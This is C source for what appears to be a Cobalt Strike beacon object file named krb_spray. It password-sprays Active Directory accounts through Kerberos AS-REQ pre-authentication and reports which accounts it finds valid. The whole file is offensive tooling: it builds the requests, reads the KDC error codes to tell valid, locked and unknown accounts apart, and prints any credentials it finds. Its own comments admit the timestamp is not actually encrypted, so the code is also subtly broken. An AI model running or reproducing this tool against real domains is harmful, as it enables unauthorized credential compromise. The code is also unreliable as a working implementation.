/*
 * krb_spray - Password Spraying Attack
 *
 * Tests a single password against multiple user accounts via Kerberos
 * pre-authentication. Safer than brute force as it avoids lockouts.
 *
 * Usage: krb_spray /users:USER1,USER2,USER3 /password:PASSWORD
 *                  [/domain:DOMAIN] [/dc:DC] [/delay:MS]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Build AS-REQ with encrypted timestamp pre-auth */
static int build_asreq_with_preauth(KRB_BUFFER* out, const char* domain,
                                     const char* username, const char* password) {
    KRB_BUFFER asreq, pvno, msg_type, padata, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&asreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&padata, 1024);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 512);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Protocol version */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* Message type */
    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* PA-DATA - encrypted timestamp */
    {
        KRB_BUFFER pa_enc_ts, pa_type, pa_value;
        buf_init(&pa_enc_ts, 512);
        buf_init(&pa_type, 16);
        buf_init(&pa_value, 512);

        /* PA-ENC-TIMESTAMP */
        asn1_encode_integer(&pa_type, PADATA_ENC_TIMESTAMP);
        asn1_context_wrap(&pa_enc_ts, 1, &pa_type);

        /* Get current time and create timestamp */
        FILETIME ft;
        SYSTEMTIME st;
        KERNEL32$GetSystemTimeAsFileTime(&ft);
        KERNEL32$FileTimeToSystemTime(&ft, &st);

        /* Encode PA-ENC-TS-ENC (patimestamp, pausec) */
        KRB_BUFFER ts_enc, ts_time;
        buf_init(&ts_enc, 128);
        buf_init(&ts_time, 64);

        char timestr[32];
        sprintf(timestr, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute, st.wSecond);
        asn1_encode_generalized_time(&ts_time, timestr);
        asn1_context_wrap(&ts_enc, 0, &ts_time);

        /* For actual encryption, we'd need to derive key from password */
        /* This is a simplified version - real impl needs RC4/AES encryption */
        asn1_wrap(&tmp, ASN1_SEQUENCE, &ts_enc);

        /* Wrap as EncryptedData (simplified - not actually encrypted here) */
        KRB_BUFFER enc_data, etype_val, cipher;
        buf_init(&enc_data, 256);
        buf_init(&etype_val, 16);
        buf_init(&cipher, 256);

        asn1_encode_integer(&etype_val, ETYPE_RC4_HMAC);
        asn1_context_wrap(&enc_data, 0, &etype_val);

        asn1_encode_octet_string(&cipher, tmp.data, tmp.length);
        asn1_context_wrap(&enc_data, 2, &cipher);

        buf_reset(&tmp);
        asn1_wrap(&pa_value, ASN1_SEQUENCE, &enc_data);
        asn1_context_wrap(&pa_enc_ts, 2, &pa_value);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &pa_enc_ts);
        buf_append(&padata, tmp.data, tmp.length);

        buf_free(&pa_enc_ts);
        buf_free(&pa_type);
        buf_free(&pa_value);
        buf_free(&ts_enc);
        buf_free(&ts_time);
        buf_free(&enc_data);
        buf_free(&etype_val);
        buf_free(&cipher);
    }
    buf_reset(&tmp);

    /* Wrap padata */
    asn1_wrap(&tmp, ASN1_SEQUENCE, &padata);
    asn1_context_wrap(&asreq, 3, &tmp);
    buf_reset(&tmp);


    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* Client principal name */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_PRINCIPAL);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, username);
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 1, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Realm */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* Server principal name (krbtgt/REALM) */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, "krbtgt");
        {
            KRB_BUFFER realm_str;
            buf_init(&realm_str, 128);
            asn1_encode_general_string(&realm_str, domain);
            buf_append(&tmp, realm_str.data, realm_str.length);
            buf_free(&realm_str);
        }
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Supported encryption types */
    asn1_encode_integer(&tmp, ETYPE_AES256_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_AES128_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
    buf_append(&etype_list, tmp.data, tmp.length);

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&asreq, 4, &req_body);


    asn1_wrap(out, ASN1_APP(KRB5_AS_REQ), &asreq);

    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&padata);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);

    return 1;
}

/* Test credentials for a single user */
static int spray_user(const char* dc_ip, const char* domain,
                       const char* username, const char* password, formatp* output) {
    WSADATA wsaData;
    SOCKET sock;
    KRB_BUFFER request;
    BYTE response[4096];
    int result = -1;

    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }

    sock = connect_to_kdc(dc_ip, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        WS2_32$WSACleanup();
        return -1;
    }

    buf_init(&request, 2048);
    build_asreq_with_preauth(&request, domain, username, password);

    if (send_krb_msg(sock, request.data, request.length) > 0) {
        int recv_len = recv_krb_msg(sock, response, sizeof(response));
        if (recv_len > 4) {
            BYTE* resp_data = response + 4;

            if (resp_data[0] == 0x6B) {
                /* AS-REP - credentials valid! */
                result = 1;
            } else if (resp_data[0] == 0x7E) {
                /* KRB-ERROR - parse error code */
                size_t offset = 2;
                asn1_decode_length(resp_data, &offset);

                while (offset < (size_t)(recv_len - 4) - 2) {
                    if (resp_data[offset] == 0xA6) {
                        offset++;
                        asn1_decode_length(resp_data, &offset);
                        if (resp_data[offset] == ASN1_INTEGER) {
                            offset++;
                            size_t int_len = asn1_decode_length(resp_data, &offset);
                            int error_code = 0;
                            for (size_t i = 0; i < int_len && i < 4; i++) {
                                error_code = (error_code << 8) | resp_data[offset + i];
                            }

                            if (error_code == KDC_ERR_PREAUTH_FAILED) {
                                result = 0;  /* Invalid password */
                            } else if (error_code == KDC_ERR_C_PRINCIPAL_UNKNOWN) {
                                result = -2;  /* User not found */
                            } else if (error_code == KDC_ERR_CLIENT_REVOKED) {
                                result = -3;  /* Account disabled/locked */
                            } else if (error_code == KDC_ERR_PREAUTH_REQUIRED) {
                                /* Pre-auth required - try without preauth first */
                                result = 0;
                            } else {
                                result = -error_code;
                            }
                        }
                        break;
                    }
                    offset++;
                }
            }
        }
    }

    buf_free(&request);
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();

    return result;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* users = NULL;
    char* password = NULL;
    char* domain = NULL;
    char* dc = NULL;
    char* delay_str = NULL;
    int valid_count = 0;
    int tested_count = 0;
    int delay_ms = 0;

    BeaconFormatAlloc(&output, 16384);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Password Spraying\n\n");


    users = arg_get(&parser, "users");
    password = arg_get(&parser, "password");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    delay_str = arg_get(&parser, "delay");

    if (!users || !password) {
        BeaconFormatPrintf(&output, "[-] Error: /users:USER1,USER2 and /password:PASSWORD required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_spray /users:admin,jsmith,svc_sql /password:Winter2024!\n");
        BeaconFormatPrintf(&output, "                [/domain:DOMAIN] [/dc:DC] [/delay:MS]\n\n");
        BeaconFormatPrintf(&output, "Options:\n");
        BeaconFormatPrintf(&output, "  /delay:MS - Delay between attempts (default: 0)\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
    }

    if (!dc) {
        BeaconFormatPrintf(&output, "[-] Error: /dc:DC_IP required\n");
        goto cleanup;
    }

    if (delay_str) {
        delay_ms = atoi(delay_str);
        if (delay_ms < 0) delay_ms = 0;
    }

    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);
    BeaconFormatPrintf(&output, "[*] Password: %s\n", password);
    if (delay_ms > 0) {
        BeaconFormatPrintf(&output, "[*] Delay: %d ms\n", delay_ms);
    }
    BeaconFormatPrintf(&output, "\n[*] Spraying password against users...\n\n");

    /* Parse and test users */
    char* user_list = (char*)malloc(strlen(users) + 1);
    strcpy(user_list, users);

    char* token = user_list;
    char* next;
    while (token && *token) {
        next = strchr(token, ',');
        if (next) *next++ = '\0';

        /* Trim whitespace */
        while (*token == ' ') token++;
        char* end = token + strlen(token) - 1;
        while (end > token && *end == ' ') *end-- = '\0';

        if (*token) {
            tested_count++;
            int result = spray_user(dc, domain, token, password, &output);

            if (result == 1) {
                BeaconFormatPrintf(&output, "[+] VALID: %s\\%s:%s\n", domain, token, password);
                valid_count++;
            } else if (result == 0) {
                BeaconFormatPrintf(&output, "[-] Invalid: %s\n", token);
            } else if (result == -2) {
                BeaconFormatPrintf(&output, "[!] User not found: %s\n", token);
            } else if (result == -3) {
                BeaconFormatPrintf(&output, "[!] Account locked/disabled: %s\n", token);
            } else {
                BeaconFormatPrintf(&output, "[?] Error for %s: %d\n", token, result);
            }

            if (delay_ms > 0 && next && *next) {
                KERNEL32$Sleep(delay_ms);
            }
        }

        token = next;
    }

    free(user_list);

    BeaconFormatPrintf(&output, "\n========================================\n");
    BeaconFormatPrintf(&output, "[*] Spray complete: %d/%d valid credentials\n", valid_count, tested_count);

    if (valid_count > 0) {
        BeaconFormatPrintf(&output, "\n[!] Valid credentials found!\n");
    }

cleanup:
    if (users) free(users);
    if (password) free(password);
    if (domain) free(domain);
    if (dc) free(dc);
    if (delay_str) free(delay_str);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
